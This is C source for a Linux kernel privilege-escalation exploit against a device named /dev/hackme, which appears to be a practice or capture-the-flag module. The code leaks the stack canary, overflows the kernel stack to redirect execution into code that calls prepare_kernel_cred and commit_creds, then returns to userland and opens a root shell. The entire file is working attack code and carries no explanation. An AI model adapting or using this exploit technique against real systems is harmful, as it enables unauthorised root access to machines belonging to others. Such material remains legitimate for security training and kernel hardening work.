#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#define KSYMS "/proc/kallsyms"
#define WORD_SZ 32
struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));

prepare_kernel_cred_t   prepare_kernel_cred;
commit_creds_t    commit_creds;
int global_fd;

/*
This doesn't work since reading KSYMS gives 0 due to permissions
void* getSym(u_int8_t *fname) {
    size_t len = strlen((char*)fname);
    intptr_t addr = 0;
    u_int8_t *buf = calloc(32, 1);
    FILE *fd = fopen(KSYMS, "r");
    char line[128] = {0};
    while(fgets(line, sizeof(line), fd)) {
        u_int8_t *token = (u_int8_t*)strdup(line+WORD_SZ/4+3);
        if (!strncmp((char*)fname, (char*)token, len)) {
            memcpy(buf, line, WORD_SZ/4);
            addr = (intptr_t)strtoul((char*)buf, 0, 16);
            break;
        }
        free(token);
    }
    fclose(fd);
    free(buf);
    return (void*)addr;
}

void getFuncPtrs(){
	commit_creds = getSym("commit_creds");
	prepare_kernel_cred = getSym("prepare_kernel_cred");
	printf("commit_creds is at %x\nprepare_kernel_cred is at %x", commit_creds, prepare_kernel_cred);
}*/

void open_dev(){
    global_fd = open("/dev/hackme", O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
        puts("[*] Opened device");
    }
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

unsigned long cookie;

void leak(void){
    unsigned n = 20;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak));
    cookie = leak[16];
    printf("[*] Leaked %zd bytes\n", r);
    printf("[*] Cookie: %lx\n", cookie);
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long user_rip = (unsigned long)get_shell;

void escalate_privs(void){
	if(commit_creds && prepare_kernel_cred){
    __asm__(
        ".intel_syntax noprefix;"
        "mov rax, prepare_kernel_cred;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "mov rax, commit_creds;" //commit_creds
	    "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
	} else {
		printf("prepare_kernel_cred: %x\ncommit_creds: %x", prepare_kernel_cred, commit_creds);
 		exit(0);
	}
}

void overflow(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = (unsigned long)escalate_privs; // ret
    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));
    puts("[!] Should never be reached");
}

int main(int argc, char** argv) {
    if(argc!=3) {
	printf("Usage: %s commit_creds prepare_kernel_cred\n", argv[0]);
    	exit(-1);
	}
    sscanf(argv[1], "%lx", &commit_creds);
    sscanf(argv[2], "%lx", &prepare_kernel_cred);
    //getFuncPtrs();
    save_state();
    open_dev();
    leak();
    overflow();
    puts("[!] Should never be reached");
    return 0;
}
